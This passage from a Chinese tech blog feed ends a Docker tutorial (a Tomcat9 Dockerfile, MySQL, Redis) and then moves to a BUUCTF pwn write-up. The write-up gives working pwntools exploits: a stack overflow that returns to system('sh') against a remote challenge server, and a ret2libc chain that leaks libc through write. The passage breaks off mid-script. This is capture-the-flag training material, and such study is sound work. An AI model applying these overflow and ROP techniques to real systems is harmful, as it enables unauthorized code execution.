class="headerlink" title="(3) 自定义镜像Tomcat9"></a>(3) 自定义镜像Tomcat9</h4><ul><li>创建工作目录：<code>mkdir -p /mydockerfile/tomcat9</code></li><li>新建txt文件：<code>touch c.txt</code></li><li>将jdk和tomcat安装的压缩包拷贝到新建的目录<ul><li><code>cp /jdk-8u171-linux-x64.tar.gz</code></li><li><code>cp /opt/apache-tomcat-9.0.8.tar.gz</code></li></ul></li><li>新建DockerFile文件：<code>vim Dockerfile</code></li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs awk">FROM centos<br>MAINTAINER zuzhiang&lt;zuzhiang@<span class="hljs-number">126</span>.com&gt;<br><span class="hljs-comment"># 把宿主机当前上下文的c.txt靠背巾容器/usr/local/路径下</span><br>COPY c.txt <span class="hljs-regexp">/usr/</span>local/cincontainer.txt<br><span class="hljs-comment"># 把javahetomcat添加到容器内</span><br>ADD jdk-<span class="hljs-number">8</span>u171-linux-x64.tar.gz <span class="hljs-regexp">/usr/</span>local<br>ADD apache-tomcat-<span class="hljs-number">9.0</span>.<span class="hljs-number">8</span>.tar.gz<br><span class="hljs-comment"># 安装vim编辑器</span><br>RUN yum -y install vim<br>ENV MYPATH <span class="hljs-regexp">/usr/</span>local<br>WORKDIR <span class="hljs-variable">$MYPATH</span><br><span class="hljs-comment"># 配置java和tomcat环境变量</span><br>ENV JAVA_HOME <span class="hljs-regexp">/usr/</span>local/jdk1.<span class="hljs-number">8.0</span>_171<br>ENV CLASSPATH <span class="hljs-variable">$JAVA_HOME</span><span class="hljs-regexp">/lib/</span>dt.jar:<span class="hljs-variable">$JAVA_HOME</span><span class="hljs-regexp">/lib/</span>tools.jar<br>ENV CATALINA_HOME <span class="hljs-regexp">/usr/</span>local/apache-tomcat-<span class="hljs-number">9.0</span>.<span class="hljs-number">8</span><br>ENV CATALINA_BASE <span class="hljs-regexp">/usr/</span>local/apache-tomcat-<span class="hljs-number">9.0</span>.<span class="hljs-number">8</span><br>ENV PATH <span class="hljs-variable">$PATH</span>:<span class="hljs-variable">$JAVA_HOME</span><span class="hljs-regexp">/bin:$CATALINA_HOME/</span>lib:<span class="hljs-variable">$CATALINA_HOME</span>/bin<br><span class="hljs-comment"># 容器运行时的监听的端口</span><br>ENVEXPOSE <span class="hljs-number">8080</span><br><span class="hljs-comment"># ENTRYPOINT [&quot;/usr/local/apache-tomcat-9.0.8/bin/startup.sh&quot;]</span><br><span class="hljs-comment"># CMD [&quot;/usr/local/apache-tomcat-9.0.8/bin/catalina.sh&quot;,&quot;run&quot;]</span><br>CMD <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/apache-tomcat-9.0.8/</span>bin<span class="hljs-regexp">/startup.sh &amp;&amp; tail -F /u</span>sr<span class="hljs-regexp">/local/</span>apache-tomcat-<span class="hljs-number">9.0</span>.<span class="hljs-number">8</span><span class="hljs-regexp">/bin/</span>logs/catalina.out<br></code></pre></td></tr></table></figure><p>构建：<code>docker build -t zzatomcat9</code> </p><img src="/2023/08/06/%E5%B0%9A%E7%A1%85%E8%B0%B7Docker/image-20230808204336531.png" class title="image-20230808204336531"><p>运行：<code>docker run -d -p 9080:8080 --name myt9 -v /mydockerfile/tomcat9/test:/usr/local/apache-tomcat-9.0.8/webapps/test -v /mydockerfile/tomcat9/tomcat9logs/:/usr/local/apache-tomcat-9.0.8/logs --privileged=true zzatomcat9</code></p><p>验证：在浏览器访问localhost:9080</p><h4 id="4-综合前面的tomcat容器卷将测试的web服务test发布"><a href="#4-综合前面的tomcat容器卷将测试的web服务test发布" class="headerlink" title="(4) 综合前面的tomcat容器卷将测试的web服务test发布"></a>(4) 综合前面的tomcat容器卷将测试的web服务test发布</h4><ul><li>总体概述</li></ul><img src="/2023/08/06/%E5%B0%9A%E7%A1%85%E8%B0%B7Docker/image-20230808204411995.png" class title="image-20230808204411995"><p><em>在mydockerfile&#x2F;tomcat9&#x2F;test下</em></p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stata"># 在mydockerfile/tomcat9/<span class="hljs-keyword">test</span>下<br><span class="hljs-keyword">mkdir</span> WEB-<span class="hljs-keyword">INF</span><br><span class="hljs-keyword">cd</span> WEB-<span class="hljs-keyword">INF</span><br>vim web.xml<br><span class="hljs-keyword">cd</span> ..<br>vim a.jsp<br></code></pre></td></tr></table></figure><p>web.xml内容:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag"></span><br><span class="hljs-tag">  <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://java.sun.com/xml/ns/javaee&quot;</span></span><br><span class="hljs-tag"></span><br><span class="hljs-tag">  <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd&quot;</span></span><br><span class="hljs-tag"></span><br><span class="hljs-tag">  <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;WebApp_ID&quot;</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;2.5&quot;</span>&gt;</span><br><br>  <br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">display-name</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">display-name</span>&gt;</span><br><br> <br><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure><p>a.jsp内容:</p><figure class="highlight erb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs erb"><span class="language-xml">&lt;%</span><span class="language-ruby">@ page language=<span class="hljs-string">&quot;java&quot;</span> contentType=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="hljs-string">&quot;UTF-8&quot;</span> </span><span class="language-xml">%&gt;</span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span> <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//W3C//DTD HTML 4.0.1 Transitional//EN&quot;</span> <span class="hljs-string">&quot;http://www.23.org/TR/html/loose.dtd&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Insert title here<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml">        -------------------welcome------------------</span><br><span class="language-xml">        &lt;%=</span><span class="language-ruby"><span class="hljs-string">&quot;I am in docker tomcat self&quot;</span></span><span class="language-xml">%&gt;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span></span><br><span class="language-xml">        &lt;%</span><span class="language-ruby"> <span class="hljs-title class_">System</span>.out.println(<span class="hljs-string">&quot;=============docker tomcat self&quot;</span>);</span><span class="language-xml">%&gt;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>测试：在浏览器访问<code>localhost:9080/test/a.jsp</code></p><img src="/2023/08/06/%E5%B0%9A%E7%A1%85%E8%B0%B7Docker/image-20230808204519883.png" class title="image-20230808204519883"><h3 id="4-小总结"><a href="#4-小总结" class="headerlink" title="4. 小总结"></a>4. 小总结</h3><img src="/2023/08/06/%E5%B0%9A%E7%A1%85%E8%B0%B7Docker/image-20230808204533636.png" class title="image-20230808204533636"><h2 id="六、Docker常用安装"><a href="#六、Docker常用安装" class="headerlink" title="六、Docker常用安装"></a>六、Docker常用安装</h2><h3 id="1-安装tomcat"><a href="#1-安装tomcat" class="headerlink" title="1. 安装tomcat"></a>1. 安装tomcat</h3><ul><li><code>docker search tomcat</code> ：docker hub上面查找tomcat镜像</li></ul><img src="/2023/08/06/%E5%B0%9A%E7%A1%85%E8%B0%B7Docker/image-20230808204550592.png" class title="image-20230808204550592"><p><code>docker pull tomcat</code>：从docker hub上拉取tomcat镜像到本地</p><img src="/2023/08/06/%E5%B0%9A%E7%A1%85%E8%B0%B7Docker/image-20230808204601371.png" class title="image-20230808204601371"><ul><li><code>docker images</code>：查看你是否有拉取到tomcat</li><li><code>docker run -it -p 8080:8080 tomcat</code>：运行镜像</li></ul><img src="/2023/08/06/%E5%B0%9A%E7%A1%85%E8%B0%B7Docker/image-20230808204612135.png" class title="image-20230808204612135"><h3 id="2-安装MySQL"><a href="#2-安装MySQL" class="headerlink" title="2. 安装MySQL"></a>2. 安装MySQL</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker search mysql <span class="hljs-comment"># docker hub上面查找mysql镜像</span><br>docker pull mysql:<span class="hljs-number">5.6</span> <span class="hljs-comment"># 从docker hub上拉取mysql:5.6镜像到本地</span><br>docker images <span class="hljs-comment"># 查看你是否有拉取到mysql</span><br><span class="hljs-comment"># 运行镜像</span><br>docker run -p <span class="hljs-number">12345</span>:<span class="hljs-number">3306</span> --name mysql -v <span class="hljs-regexp">/zza/my</span>sql<span class="hljs-regexp">/conf:/</span>etc<span class="hljs-regexp">/mysql/</span>conf.d -v <span class="hljs-regexp">/zza/my</span>sql<span class="hljs-regexp">/logs:/</span>logs -v <span class="hljs-regexp">/zza/my</span>sql<span class="hljs-regexp">/data:/</span>var<span class="hljs-regexp">/lib/my</span>sql -e MYSQL_ROOT_PASSWORD=<span class="hljs-number">123456</span> -d mysql:<span class="hljs-number">5.6</span><br></code></pre></td></tr></table></figure><h3 id="3-安装redis"><a href="#3-安装redis" class="headerlink" title="3. 安装redis"></a>3. 安装redis</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker search redis <span class="hljs-comment"># docker hub上面查找redis镜像</span><br>docker pull redis:<span class="hljs-number">3.2</span> <span class="hljs-comment"># 从docker hub上拉取redis:3.2镜像到本地</span><br>docker images <span class="hljs-comment"># 查看你是否有拉取到redis</span><br><span class="hljs-comment"># 运行镜像</span><br>docker run -p <span class="hljs-number">6379</span>:<span class="hljs-number">6379</span> -v <span class="hljs-regexp">/zza/my</span>redis<span class="hljs-regexp">/data:/</span>data -v <span class="hljs-regexp">/zza/my</span>redis<span class="hljs-regexp">/conf/</span>redis.conf:<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/etc/</span>redis<span class="hljs-regexp">/redis.conf -d redis:3.2 redis-server /u</span>sr<span class="hljs-regexp">/local/</span>etc<span class="hljs-regexp">/redis/</span>redis.conf --appendonly yes<br><span class="hljs-comment"># 在/zza/myredis/conf/redis.conf目录下新建redis.conf文件</span><br>vim <span class="hljs-regexp">/zza/my</span>redis<span class="hljs-regexp">/conf/</span>redis.conf/redis.conf<br><span class="hljs-comment"># 添加redis配置文件</span><br><span class="hljs-comment"># 进入reids并添加键值对</span><br>docker exec -it redis容器id redis-cli<br></code></pre></td></tr></table></figure><h2 id="七、本地镜像推送到阿里云"><a href="#七、本地镜像推送到阿里云" class="headerlink" title="七、本地镜像推送到阿里云"></a>七、本地镜像推送到阿里云</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs vim">docker run -it 镜像<br>docker -<span class="hljs-keyword">a</span> zuzhiang -<span class="hljs-keyword">m</span> <span class="hljs-string">&quot;new mycentos 1.4 from 1.3&quot;</span> 镜像id 新镜像名<br># 在阿里云开发者平台创建仓库镜像<br># 将镜像推送到registry<br>docker --username= registry.<span class="hljs-keyword">cn</span>-hangzhou.aliyuncs.<span class="hljs-keyword">com</span><br>docker <span class="hljs-keyword">tag</span> 镜像id registry.<span class="hljs-keyword">cn</span>-hangzhou.aliyuncs.<span class="hljs-keyword">com</span>/zuzhiang/centos.<span class="hljs-number">1.4</span><br>docker push registry.<span class="hljs-keyword">cn</span>-hangzhou.aliyuncs.<span class="hljs-keyword">com</span>/zuzhiang/centos.<span class="hljs-number">1.4</span><br># 在https://dev.aliyun.<span class="hljs-keyword">com</span>查找<br>docker pull registry.<span class="hljs-keyword">cn</span>-hangzhou.aliyuncs.<span class="hljs-keyword">com</span>/zuzhiang/centos.<span class="hljs-number">1.4</span><br></code></pre></td></tr></table></figure><img src="/2023/08/06/%E5%B0%9A%E7%A1%85%E8%B0%B7Docker/image-20230808204717043.png" class title="image-20230808204717043"><h1 id="Docker高级篇"><a href="#Docker高级篇" class="headerlink" title="Docker高级篇"></a>Docker高级篇</h1><p><a href="https://blog.csdn.net/qq_37151886/article/details/122564779">docker笔记高级篇2022新版_docker最新版本 cluster store_newProxyInstance的博客-CSDN博客</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>pwn题第六天</title>
    <link href="/2023/02/25/pwn%E9%A2%98%E7%AC%AC%E5%85%AD%E5%A4%A9/"/>
    <url>/2023/02/25/pwn%E9%A2%98%E7%AC%AC%E5%85%AD%E5%A4%A9/</url>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF刷题"><a href="#BUUCTF刷题" class="headerlink" title="BUUCTF刷题"></a>BUUCTF刷题</h1><h3 id="others-shellcode"><a href="#others-shellcode" class="headerlink" title="others_shellcode"></a>others_shellcode</h3><p>写这道题之前, 大家首先要了解, 想要获得一个shell, 除了system(“&#x2F;bin&#x2F;sh”) 以外, 还有一种更好的方法, 就是系统调用中的 execve(“&#x2F;bin&#x2F;sh”, NULL, NULL)获得shell。我们可以在 Linxu系统调用号表 中找到对应的系统调用号,进行调用, 其中32位程序系统调用号用 eax 储存, 第一 、 二 、 三参数分别在 ebx 、ecx 、edx中储存。 可以用 int 80 汇编指令调用。64位程序系统调用号用 rax 储存, 第一 、 二 、 三参数分别在 rdi 、rsi 、rdx中储存。 可以用 syscall 汇编指令调用。</p><h5 id="函数定义："><a href="#函数定义：" class="headerlink" title="函数定义："></a>函数定义：</h5><p>int execve(const char *filename, char *const argv[ ], char *const envp[ ]);</p><p>寄存器eax放execve的系统调用号11；<br>寄存器ebx放文件路径，即第一个参数；<br>寄存器ecx放第二个参数，是利用数组指针把内容传递给执行文件，并且需要以空指针(NULL)结束；<br>寄存器edx放最后一个参数，为传递给执行文件的新环境变量数组。</p><p>int 0x80：中断<br>执行系统调用函数execve()时，execve()通过int 0x80指令进入系统调用入口程序，并且把系统调用号11放入eax中，接着把参数放入ebx，ecx和edx中。</p><p>先checksec一下, 没什么32位程序,开启了NX保护</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><br><span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>      <span class="hljs-string">PIE</span> <span class="hljs-string">enabled</span><br></code></pre></td></tr></table></figure><p>连个输出都没有,注意到getshell函数上面的result变量 旁边的 eax。函数名叫getshell肯定是暗示在这里进行获得shell的。</p><img src="/2023/02/25/pwn%E9%A2%98%E7%AC%AC%E5%85%AD%E5%A4%A9/image-20230225152906911.png" class title="image-20230225152906911"><img src="/2023/02/25/pwn%E9%A2%98%E7%AC%AC%E5%85%AD%E5%A4%A9/image-20230225152933669.png" class title="image-20230225152933669"><p>在汇编中看看, 发现有 <strong>int 80</strong> 指令。eax &#x3D; 0FFFFFFFFh - 0FFFFFFF4h &#x3D; 11。看上面函数也发现result也就是eax的值就是11</p><img src="/2023/02/25/pwn%E9%A2%98%E7%AC%AC%E5%85%AD%E5%A4%A9/image-20230225153053681.png" class title="image-20230225153053681"><p>存在execve，11，int 80h等字眼，感觉就像是系统调用system函数。查看一下汇编代码，果然是这样，既然直接调用了system函数，那么直接nc就可以获得flag了。不过由于使用汇编语言写的，可能就没那么容易理解了。</p><h3 id="ciscn-2019-ne-5"><a href="#ciscn-2019-ne-5" class="headerlink" title="ciscn_2019_ne_5"></a>ciscn_2019_ne_5</h3><p>check：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><br><span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">（0x8048000）</span><br></code></pre></td></tr></table></figure><p>查看字符串，发现flag字样，跟进后ctrl+x找到调用函数，提示我们要输入的log就是flag</p><p><img src="/2023/02/25/pwn%E9%A2%98%E7%AC%AC%E5%85%AD%E5%A4%A9/Workspaces\hexo\source_posts\pwn题第六天\image-20230225153648894.png" alt="image-20230225153648894"></p><img src="/2023/02/25/pwn%E9%A2%98%E7%AC%AC%E5%85%AD%E5%A4%A9/image-20230225153753037.png" class title="image-20230225153753037"><p>看一下main函数，s1在接收admin的密码administrator，这边读入了100个长度的字符，看到15行，给s1的大小只有48，这边存在溢出漏洞</p><img src="/2023/02/25/pwn%E9%A2%98%E7%AC%AC%E5%85%AD%E5%A4%A9/image-20230225153820252.png" class title="image-20230225153820252"><p>根据之前那个flag的提示，之后我们应该选1，添加一个log，之后应该选4去调用getflag，然后结束程序</p><img src="/2023/02/25/pwn%E9%A2%98%E7%AC%AC%E5%85%AD%E5%A4%A9/image-20230225153850505.png" class title="image-20230225153850505"><img src="/2023/02/25/pwn%E9%A2%98%E7%AC%AC%E5%85%AD%E5%A4%A9/image-20230225153857200.png" class title="image-20230225153857200"><p>搞清楚程序逻辑后尝试构造payload，主要是利用选择1之后的那一次输入，a1就是外面的src，程序给的大小是48，这边读入的时候读入了128长度的字符串，可以造成溢出，将程序的返回地址覆盖成system（‘&#x2F;bin&#x2F;sh’），然后选4去调用读取我们构造好的栈，获取shell</p><p>尝试用ROPgadget来搜索一下程序里的’&#x2F;bin&#x2F;sh’字符串的地址的，没有找到，但是发现有‘sh’字符串，这个效果和‘&#x2F;bin&#x2F;sh’是一样的效果</p><img src="/2023/02/25/pwn%E9%A2%98%E7%AC%AC%E5%85%AD%E5%A4%A9/image-20230225153950362.png" class title="image-20230225153950362"><p>这样我们就可以构造我们的payload&#x3D;‘a’*（0x48+4）+p32(system_addr)+‘aaaa’+p32(shell_addr)<br>之后选4去调用我们的这个构造好的栈即可获取shell</p><p>exp如下：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import*<br><br><span class="hljs-attribute">r</span>=remote(&quot;node3.buuoj.cn&quot;,27108)<br><span class="hljs-attribute">elf</span>=ELF(&#x27;ciscn_2019_ne_5&#x27;)<br><span class="hljs-attribute">system_addr</span>=elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-attribute">shell_addr</span>=0x80482ea<br><br>r.recvuntil(<span class="hljs-string">&#x27;Please input admin password:&#x27;</span>)<br>r.sendline(<span class="hljs-string">&#x27;administrator&#x27;</span>)<br><br>r.recvuntil(<span class="hljs-string">&#x27;0.Exit\n:&#x27;</span>)<br>r.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br><br><span class="hljs-attribute">payload</span>=<span class="hljs-string">&#x27;a&#x27;</span>*(0x48+4)+p32(system_addr)+&#x27;1234&#x27;+p32(shell_addr)<br><br>r.recvuntil(<span class="hljs-string">&#x27;Please input new log info:&#x27;</span>)<br>r.sendline(payload)<br><br>r.recvuntil(<span class="hljs-string">&#x27;0.Exit\n:&#x27;</span>)<br>r.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br><br>r.interactive()<br></code></pre></td></tr></table></figure><p>参考文章:[(82条消息) [BUUCTF]PWN——ciscn_2019_ne_5_Angel<del>Yan的博客-CSDN博客_ciscn_2019_ne_5](<a href="https://blog.csdn.net/mcmuyanga/article/details/108914595?ops_request_misc=%7B%22request_id%22:%22167731053916800184181833%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=167731053916800184181833&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2">https://blog.csdn.net/mcmuyanga/article/details/108914595?ops_request_misc=%7B%22request%5Fid%22%3A%22167731053916800184181833%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=167731053916800184181833&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2</a></del>all<del>sobaiduend</del>default-1-108914595-null-null.142^v73^insert_down3,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term&#x3D;buuctf ciscn_2019_ne_5&amp;spm&#x3D;1018.2226.3001.4187)</p><h3 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a>铁人三项(第五赛区)_2018_rop</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><br><span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">（0x8048000）</span><br></code></pre></td></tr></table></figure><p>main函数没有什么有用信息</p><img src="/2023/02/25/pwn%E9%A2%98%E7%AC%AC%E5%85%AD%E5%A4%A9/image-20230225154637316.png" class title="image-20230225154637316"><p>第4行的函数是我们的输入点，read的buf长度为0x100，而我们参数的大小只有0x88，可以溢出0x78个长度，足够我们构造rop攻击</p><img src="/2023/02/25/pwn%E9%A2%98%E7%AC%AC%E5%85%AD%E5%A4%A9/image-20230225154726718.png" class title="image-20230225154726718"><p>没有其他信息了，经典的泄露libc类型的题目</p><h2 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h2><ol><li>利用write函数来泄露程序的libc版本</li><li>知道libc版本后去计算程序里的system函数和字符串“&#x2F;bin&#x2F;sh”的地址</li><li>覆盖返回地址为system（‘&#x2F;bin&#x2F;sh’），获取shell</li></ol><h2 id="利用过程："><a href="#利用过程：" class="headerlink" title="利用过程："></a>利用过程：</h2><p>1.泄露libc版本<br>这边提一下write函数的原型</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">ssize_t</span> <span class="hljs-title">write</span><span class="hljs-params">(<span class="hljs-type">int</span> fd,<span class="hljs-type">const</span> <span class="hljs-type">void</span>*buf,<span class="hljs-type">size_t</span> count)</span></span>;<br></code></pre></td></tr></table></figure><p>参数说明：<br>fd:是文件描述符（write所对应的是写，即就是1）<br>buf:通常是一个字符串，需要写入的字符串<br>count：是每次写入的字节数</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">payload=<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0</span>x88+<span class="hljs-number">4</span>)+<span class="hljs-built_in">p32</span>(write_plt)+<span class="hljs-built_in">p32</span>(main)+<span class="hljs-built_in">p32</span>(<span class="hljs-number">0</span>)+<span class="hljs-built_in">p32</span>(write_got)+<span class="hljs-built_in">p32</span>(<span class="hljs-number">4</span>)<br>r<span class="hljs-selector-class">.sendline</span>(payload)<br>write_addr=<span class="hljs-built_in">u32</span>(r<span class="hljs-selector-class">.recv</span>(<span class="hljs-number">4</span>))<br>libc=<span class="hljs-built_in">LibcSearcher</span>(<span class="hljs-string">&#x27;write&#x27;</span>,write_addr)<br></code></pre></td></tr></table></figure><p>这边解释一下第一个payload<br>首先填充‘a’*（0x88+4）造成溢出，覆盖到返回地址，返回地址填上write函数的plt地址来调用write函数，之后跟上main函数地址（我们要将程序程序重新执行一遍，再次利用输入点来进构造rop）<br>p32（0）+p32(write_addr)+p32(4)是在设置write函数的参数，对应函数原型看一下，32位程序是4位，所以这边写的4，对应的64位程序是8位</p><p>2.算出程序的偏移量，计算system和bin&#x2F;sh的地址</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">offset</span>=write_addr-libc.dump(<span class="hljs-string">&#x27;write&#x27;</span>)     <span class="hljs-comment">#计算偏移量</span><br>                                <span class="hljs-comment">#偏移量=程序里的函数地址-libc里的函数地址</span><br><span class="hljs-attr">system_addr</span>=<span class="hljs-literal">off</span>set+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><span class="hljs-attr">bin_sh</span>=<span class="hljs-literal">off</span>set+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br></code></pre></td></tr></table></figure><p>3.构造rop获取shell</p><p>完整EXP：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 